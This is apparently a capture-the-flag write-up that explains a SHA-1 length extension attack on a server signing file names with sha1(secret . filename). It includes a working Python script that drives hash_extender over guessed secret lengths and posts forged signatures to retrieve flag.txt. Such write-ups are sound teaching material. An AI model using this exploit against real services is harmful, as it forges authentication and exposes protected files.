This is a length extension attack
The server computes a signature using:
$sig = sha1($secret . $reqFile);
This simply prepend a secret to the message (the file name) and then applies SHA-1
The concept:
Given H = sha1(secret || data) and knowing data, we can:
sha1(secret || data || glue_padding || extra)
This can be done by knowing the signature of test.txt. Which is given to us in the web page:
Currently available files: [&quot;test.txt&quot;, &quot;flag.txt&quot;]  
Secret Signature of test.txt = c9d4b01ce16b640782af2864a47547d88fc02cab

We find this WU: ctftime.org/writeup/8505
Which explains the attack with the use of a tool: hash_extender
github.com/iagox86/hash_extender/tree/master
Now we can compute an attack that will:

Command a string that will call hash_extender to create the attack:
./hash_extender --signature=&#039;c9d4b01ce16b640782af2864a47547d88fc02cab&#039; --data=&quot;test.txt&quot; --append=&quot; flag.txt&quot; --secret=$i --format=sha1

As we do not know the length of the secret we will do a loop. Then try to do the request to the server until one matches the constraints:
#!/usr/bin/env python3
#coding:utf8
import requests
import os

url = &quot;ctf.hackademics-forum.com:33819/&quot;
headers = {
    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
}

# Ensure the output directory exists
if not os.path.exists(&quot;output&quot;):
    os.makedirs(&quot;output&quot;)

# Remove any previous output file
output_file = &quot;output/out&quot;
if os.path.exists(output_file):
    os.remove(output_file)

# Launch hash_extender for secret lengths 0 to 63 and append results to the output file.
for i in range(64):
    cmd = &#039;./hash_extender --signature=&quot;c9d4b01ce16b640782af2864a47547d88fc02cab&quot; --data=&quot;test.txt&quot; --append=&quot; flag.txt&quot; --secret=%d --format=sha1 &gt;&gt; %s&#039; % (i, output_file)
    print(&quot;Running: &quot; + cmd)
    os.system(cmd)

# Read the output file
with open(output_file, &quot;r&quot;) as f:
    content = f.read()

# Split the output based on &quot;New signature:&quot; (each candidate output should include it)
candidates = content.split(&quot;New signature:&quot;)

# Process each candidate result (skip the first chunk if it&#039;s preamble)
for candidate in candidates[1:]:
    lines = candidate.splitlines()
    new_sig = lines[0].strip()
    new_str = None

    for line in lines:
        if &quot;New string:&quot; in line:
            new_str = line.split(&quot;New string:&quot;)[1].strip()
            break

    if not new_sig or not new_str:
        print(&quot;Could not parse candidate block:&quot;)
        print(candidate)
        continue

    print(&quot;Candidate found:&quot;)
    print(&quot;  New Signature: %s&quot; % new_sig)
    print(&quot;  New String: %s&quot; % new_str)

    data = {
        &quot;file&quot;: new_str,
        &quot;key&quot;: new_sig
    }

    print(&quot;Sending POST request with these parameters...&quot;)
    response = requests.post(url, headers=headers, data=data)
    print(&quot;Server response:&quot;)
    print(response.text)
    print(&quot;=&quot; * 40)
